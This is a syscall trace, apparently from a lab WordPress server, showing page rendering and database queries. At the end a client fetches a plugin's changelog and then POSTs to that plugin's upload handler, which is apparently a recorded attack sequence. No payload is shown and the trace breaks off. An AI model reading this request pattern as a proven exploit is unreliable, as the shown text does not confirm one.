+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Abstract.php", {st_mode=S_IFREG|0644, st_size=10017, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option.php", {st_mode=S_IFREG|0644, st_size=8656, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page.php", {st_mode=S_IFREG|0644, st_size=30601, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page_Tab.php", {st_mode=S_IFREG|0644, st_size=4895, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page_Section.php", {st_mode=S_IFREG|0644, st_size=6353, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Toggle.php", {st_mode=S_IFREG|0644, st_size=2459, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Select.php", {st_mode=S_IFREG|0644, st_size=5518, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Text.php", {st_mode=S_IFREG|0644, st_size=2581, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Textarea.php", {st_mode=S_IFREG|0644, st_size=2228, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Section_HTML.php", {st_mode=S_IFREG|0644, st_size=22843, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Icons.php", {st_mode=S_IFREG|0644, st_size=5758, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Registration_Tab_Template.php", {st_mode=S_IFREG|0644, st_size=5653, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Button.php", {st_mode=S_IFREG|0644, st_size=2565, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/plugin-update-checker.php", {st_mode=S_IFREG|0644, st_size=1025, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Factory.php", {st_mode=S_IFREG|0644, st_size=9497, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Factory.php", {st_mode=S_IFREG|0644, st_size=9497, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4/Factory.php", {st_mode=S_IFREG|0644, st_size=112, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4/Factory.php", {st_mode=S_IFREG|0644, st_size=112, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Autoloader.php", {st_mode=S_IFREG|0644, st_size=1354, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Autoloader.php", {st_mode=S_IFREG|0644, st_size=1354, ...}) = 0
+access("/var/www/html/wp-content/languages/plugins/social-warfare-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", R_OK) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", {st_mode=S_IFREG|0644, st_size=5979, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/languages", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+open("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", O_RDONLY) = 12
+fstat(12, {st_mode=S_IFREG|0644, st_size=5979, ...}) = 0
+lseek(12, 0, SEEK_CUR)                  = 0
+read(12, "\336\22\4\225\0\0\0\0B\0\0\0\34\0\0\0,\2\0\0\0\0\0\0<\4\0\0\0\0\0\0"..., 8192) = 5979
+lseek(12, 28, SEEK_SET)                 = 28
+read(12, "\0\0\0\0<\4\0\0\2\0\0\0=\4\0\0\21\0\0\0@\4\0\0\227\0\0\0R\4\0\0"..., 8192) = 5951
+lseek(12, 1084, SEEK_SET)               = 1084
+read(12, "\0+1\0Above the Content\0Add a desc"..., 8192) = 4895
+read(12, "", 8192)                      = 0
+close(12)                               = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/assets/js/post-editor/blocks.php", {st_mode=S_IFREG|0644, st_size=2128, ...}) = 0
+sendto(11, "-\1\0\0\3SELECT   wp_posts.ID FROM w"..., 305, MSG_DONTWAIT, NULL, 0) = 305
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0013\0\0\2\3def\twordpress\10wp_posts"..., 5685, MSG_DONTWAIT, NULL, NULL) = 78
+access("/var/www/html/wp-content/languages/en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages/en_US.php", R_OK) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/functions.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/functions.php", {st_mode=S_IFREG|0644, st_size=18793, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/themes", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/functions.php", {st_mode=S_IFREG|0644, st_size=18793, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc/custom-header.php", {st_mode=S_IFREG|0644, st_size=4380, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/inc/custom-header.php", {st_mode=S_IFREG|0644, st_size=4380, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc/template-tags.php", {st_mode=S_IFREG|0644, st_size=6590, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/inc/template-tags.php", {st_mode=S_IFREG|0644, st_size=6590, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc/template-functions.php", {st_mode=S_IFREG|0644, st_size=2556, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/inc/template-functions.php", {st_mode=S_IFREG|0644, st_size=2556, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc/customizer.php", {st_mode=S_IFREG|0644, st_size=6669, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/inc/customizer.php", {st_mode=S_IFREG|0644, st_size=6669, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/inc/icon-functions.php", {st_mode=S_IFREG|0644, st_size=7111, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/inc/icon-functions.php", {st_mode=S_IFREG|0644, st_size=7111, ...}) = 0
+access("/var/www/html/wp-content/languages/themes/twentyseventeen-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages/plugins", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/languages/themes", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+sendto(11, "Q\0\0\0\3SELECT option_value FROM wp"..., 85, MSG_DONTWAIT, NULL, 0) = 85
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1K\0\0\2\3def\twordpress\nwp_optio"..., 5607, MSG_DONTWAIT, NULL, NULL) = 102
+sendto(11, "\267\0\0\0\3SELECT SQL_CALC_FOUND_ROWS "..., 187, MSG_DONTWAIT, NULL, 0) = 187
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0013\0\0\2\3def\twordpress\10wp_posts"..., 5505, MSG_DONTWAIT, NULL, NULL) = 148
+sendto(11, "\24\0\0\0\3SELECT FOUND_ROWS()", 24, MSG_DONTWAIT, NULL, 0) = 24
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1\"\0\0\2\3def\0\0\0\fFOUND_ROWS()\0\f?"..., 5357, MSG_DONTWAIT, NULL, NULL) = 68
+sendto(11, "L\0\0\0\3SELECT wp_posts.* FROM wp_p"..., 80, MSG_DONTWAIT, NULL, 0) = 80
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0273\0\0\2\3def\twordpress\10wp_posts"..., 5289, MSG_DONTWAIT, NULL, NULL) = 5289
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "e]]\r\n\r\n&nbsp;\r\n\r\n[click_to_tweet"..., 9072, MSG_DONTWAIT, NULL, NULL) = 252
+sendto(11, "S\1\0\0\3SELECT  t.*, tt.*, tr.objec"..., 343, MSG_DONTWAIT, NULL, 0) = 343
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\v6\0\0\2\3def\twordpress\1t\10wp_ter"..., 8820, MSG_DONTWAIT, NULL, NULL) = 1329
+sendto(11, "|\0\0\0\3SELECT post_id, meta_key, m"..., 128, MSG_DONTWAIT, NULL, 0) = 128
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3C\0\0\2\3def\twordpress\vwp_postm"..., 7491, MSG_DONTWAIT, NULL, NULL) = 2654
+stat("/var/www/html/wp-includes/template-loader.php", {st_mode=S_IFREG|0644, st_size=2896, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/front-page.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/home.php", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/home.php", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-includes/theme-compat/home.php", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/index.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/index.php", {st_mode=S_IFREG|0644, st_size=2076, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/index.php", {st_mode=S_IFREG|0644, st_size=2076, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/header.php", F_OK) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/header.php", {st_mode=S_IFREG|0644, st_size=1832, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/css/ie8.css", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/js/html5.js", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/js/global.js", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js", F_OK) = 0
+sendto(11, "W\0\0\0\3SELECT option_value FROM wp"..., 91, MSG_DONTWAIT, NULL, 0) = 91
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1K\0\0\2\3def\twordpress\nwp_optio"..., 4837, MSG_DONTWAIT, NULL, NULL) = 108
+access("/var/www/html/wp-content/themes/twentyseventeen/en_US.css", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/ltr.css", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/header-image.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/header-image.php", {st_mode=S_IFREG|0644, st_size=349, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/header-image.php", {st_mode=S_IFREG|0644, st_size=349, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php", {st_mode=S_IFREG|0644, st_size=1243, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php", {st_mode=S_IFREG|0644, st_size=1243, ...}) = 0
+sendto(11, "&\0\0\0\3SELECT * FROM wp_users WHER"..., 42, MSG_DONTWAIT, NULL, 0) = 42
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\n3\0\0\2\3def\twordpress\10wp_users"..., 4729, MSG_DONTWAIT, NULL, NULL) = 901
+sendto(11, "a\0\0\0\3SELECT user_id, meta_key, m"..., 101, MSG_DONTWAIT, NULL, 0) = 101
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3C\0\0\2\3def\twordpress\vwp_userm"..., 3828, MSG_DONTWAIT, NULL, NULL) = 838
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", {st_mode=S_IFREG|0644, st_size=1961, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", {st_mode=S_IFREG|0644, st_size=1961, ...}) = 0
+writev(10, [{iov_base="HTTP/1.1 200 OK\r\nDate: Tue, 20 A"..., iov_len=288}, {iov_base="217d\r\n", iov_len=6}, {iov_base="<!DOCTYPE html>\n<html lang=\"en-U"..., iov_len=7987}, {iov_base="<h1>\303\272ltimo teste</h1>\n<p>&nbsp;"..., iov_len=586}, {iov_base="\r\n", iov_len=2}], 5) = 8869
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+sendto(11, "&\0\0\0\3SELECT * FROM wp_users WHER"..., 42, MSG_DONTWAIT, NULL, 0) = 42
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\n3\0\0\2\3def\twordpress\10wp_users"..., 2990, MSG_DONTWAIT, NULL, NULL) = 846
+sendto(11, "a\0\0\0\3SELECT user_id, meta_key, m"..., 101, MSG_DONTWAIT, NULL, 0) = 101
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3C\0\0\2\3def\twordpress\vwp_userm"..., 2144, MSG_DONTWAIT, NULL, NULL) = 1536
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+writev(10, [{iov_base="1ffa\r\n", iov_len=6}, {iov_base="\t</div><!-- .entry-content -->\n\n"..., iov_len=7607}, {iov_base="<p>Article 03</p>\n<p>&nbsp;</p>\n"..., iov_len=579}, {iov_base="\r\n", iov_len=2}], 4) = 8194
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/post/content.php", F_OK) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/sidebar.php", F_OK) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/sidebar.php", {st_mode=S_IFREG|0644, st_size=505, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/searchform.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/searchform.php", {st_mode=S_IFREG|0644, st_size=948, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/searchform.php", {st_mode=S_IFREG|0644, st_size=948, ...}) = 0
+sendto(11, "\245\0\0\0\3SELECT   wp_posts.ID FROM w"..., 169, MSG_DONTWAIT, NULL, 0) = 169
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0013\0\0\2\3def\twordpress\10wp_posts"..., 608, MSG_DONTWAIT, NULL, NULL) = 113
+sendto(11, "\353\0\0\0\3SELECT  wp_comments.comment"..., 239, MSG_DONTWAIT, NULL, 0) = 239
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1I\0\0\2\3def\twordpress\vwp_comme"..., 495, MSG_DONTWAIT, NULL, NULL) = 135
+sendto(11, "K\0\0\0\3SELECT wp_comments.* FROM w"..., 79, MSG_DONTWAIT, NULL, 0) = 79
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\17I\0\0\2\3def\twordpress\vwp_comme"..., 360, MSG_DONTWAIT, NULL, NULL) = 360
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "wordpress\vwp_comments\vwp_comment"..., 9072, MSG_DONTWAIT, NULL, NULL) = 1835
+sendto(11, "v\0\0\0\3SELECT comment_id, meta_key"..., 122, MSG_DONTWAIT, NULL, 0) = 122
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3O\0\0\2\3def\twordpress\16wp_comme"..., 7237, MSG_DONTWAIT, NULL, NULL) = 268
+sendto(11, "\332\0\0\0\3SELECT YEAR(post_date) AS `"..., 222, MSG_DONTWAIT, NULL, 0) = 222
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3\32\0\0\2\3def\0\0\0\4year\0\f?\0\4\0\0\0\3\0\200"..., 6969, MSG_DONTWAIT, NULL, NULL) = 129
+sendto(11, "\252\0\0\0\3SELECT  t.*, tt.* FROM wp_t"..., 174, MSG_DONTWAIT, NULL, 0) = 174
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\n6\0\0\2\3def\twordpress\1t\10wp_ter"..., 6840, MSG_DONTWAIT, NULL, NULL) = 728
+sendto(11, "`\0\0\0\3SELECT term_id, meta_key, m"..., 100, MSG_DONTWAIT, NULL, 0) = 100
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\3C\0\0\2\3def\twordpress\vwp_termm"..., 6112, MSG_DONTWAIT, NULL, NULL) = 244
+access("/var/www/html/wp-content/themes/twentyseventeen/footer.php", F_OK) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/footer.php", {st_mode=S_IFREG|0644, st_size=1298, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php", {st_mode=S_IFREG|0644, st_size=727, ...}) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php", {st_mode=S_IFREG|0644, st_size=727, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php", F_OK) = 0
+lstat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php", {st_mode=S_IFREG|0644, st_size=357, ...}) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php", {st_mode=S_IFREG|0644, st_size=357, ...}) = 0
+access("/var/www/html/wp-content/themes/twentyseventeen/assets/images/svg-icons.svg", F_OK) = 0
+stat("/var/www/html/wp-content/themes/twentyseventeen/assets/images/svg-icons.svg", {st_mode=S_IFREG|0644, st_size=42656, ...}) = 0
+writev(10, [{iov_base="c2a0\r\n", iov_len=6}, {iov_base="\t</div><!-- .entry-content -->\n\n"..., iov_len=7168}, {iov_base="<svg style=\"position: absolute; "..., iov_len=42656}, {iov_base="\r\n", iov_len=2}], 4) = 49832
+chdir("/var/www/html")                  = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+sendto(11, "\1\0\0\0\1", 5, MSG_DONTWAIT, NULL, 0) = 5
+close(11)                               = 0
+fcntl(8, F_SETLK, {l_type=F_UNLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
+munmap(0x7f85cc200000, 2097152)         = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+read(10, 0x7f85e3d80048, 8000)          = -1 EAGAIN (Resource temporarily unavailable)
+writev(10, [{iov_base="11\r\n", iov_len=4}, {iov_base="\n</body>\n</html>\n", iov_len=17}, {iov_base="\r\n", iov_len=2}, {iov_base="0\r\n\r\n", iov_len=5}], 4) = 28
+write(7, "192.168.0.103 - - [20/Apr/2021:0"..., 131) = 131
+times({tms_utime=53, tms_stime=9, tms_cutime=0, tms_cstime=0}) = 1431994713
+poll([{fd=10, events=POLLIN}], 1, 5000) = 1 ([{fd=10, revents=POLLIN}])
+read(10, "", 8000)                      = 0
+shutdown(10, SHUT_WR)                   = 0
+poll([{fd=10, events=POLLIN}], 1, 2000) = 1 ([{fd=10, revents=POLLIN|POLLHUP}])
+read(10, "", 512)                       = 0
+close(10)                               = 0
+read(4, 0x7ffd088e5d9f, 1)              = -1 EAGAIN (Resource temporarily unavailable)
+accept4(3, {sa_family=AF_INET, sin_port=htons(45355), sin_addr=inet_addr("192.168.0.103")}, [128->16], SOCK_CLOEXEC) = 10
+getsockname(10, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("172.18.0.3")}, [128->16]) = 0
+fcntl(10, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(10, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+read(10, "GET /wp-content/plugins/ait-csv-"..., 8000) = 162
+stat("/var/www/html/wp-content/plugins/ait-csv-import-export/changelog.txt", {st_mode=S_IFREG|0644, st_size=3824, ...}) = 0
+open("/var/www/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/.htaccess", O_RDONLY|O_CLOEXEC) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=35, ...}) = 0
+read(11, "# BEGIN WordPress\n\n# END WordPre"..., 4096) = 35
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+open("/var/www/html/wp-content/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/changelog.txt/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOTDIR (Not a directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/changelog.txt", O_RDONLY|O_CLOEXEC) = 11
+mmap(NULL, 3824, PROT_READ, MAP_SHARED, 11, 0) = 0x7f85e3e19000
+read(10, 0x7f85e3e20048, 8000)          = -1 EAGAIN (Resource temporarily unavailable)
+writev(10, [{iov_base="HTTP/1.1 200 OK\r\nDate: Tue, 20 A"..., iov_len=254}, {iov_base="v3.0.3, 6.8.2020\n---------------"..., iov_len=3824}], 2) = 4078
+munmap(0x7f85e3e19000, 3824)            = 0
+write(7, "192.168.0.103 - - [20/Apr/2021:0"..., 184) = 184
+times({tms_utime=53, tms_stime=9, tms_cutime=0, tms_cstime=0}) = 1431994714
+close(11)                               = 0
+poll([{fd=10, events=POLLIN}], 1, 5000) = 1 ([{fd=10, revents=POLLIN}])
+read(10, "", 8000)                      = 0
+shutdown(10, SHUT_WR)                   = 0
+poll([{fd=10, events=POLLIN}], 1, 2000) = 1 ([{fd=10, revents=POLLIN|POLLHUP}])
+read(10, "", 512)                       = 0
+close(10)                               = 0
+read(4, 0x7ffd088e5d9f, 1)              = -1 EAGAIN (Resource temporarily unavailable)
+accept4(3, {sa_family=AF_INET, sin_port=htons(35737), sin_addr=inet_addr("192.168.0.103")}, [128->16], SOCK_CLOEXEC) = 10
+getsockname(10, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("172.18.0.3")}, [128->16]) = 0
+fcntl(10, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(10, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+read(10, "POST /wp-content/plugins/ait-csv"..., 8000) = 1562
+stat("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php", {st_mode=S_IFREG|0644, st_size=2139, ...}) = 0
+open("/var/www/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/.htaccess", O_RDONLY|O_CLOEXEC) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=35, ...}) = 0
+read(11, "# BEGIN WordPress\n\n# END WordPre"..., 4096) = 35
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+open("/var/www/html/wp-content/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOTDIR (Not a directory)
+rt_sigaction(SIGPROF, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGHUP, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
+rt_sigaction(SIGINT, NULL, {sa_handler=0x7f85df6c5ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f85e34590c0}, 8) = 0
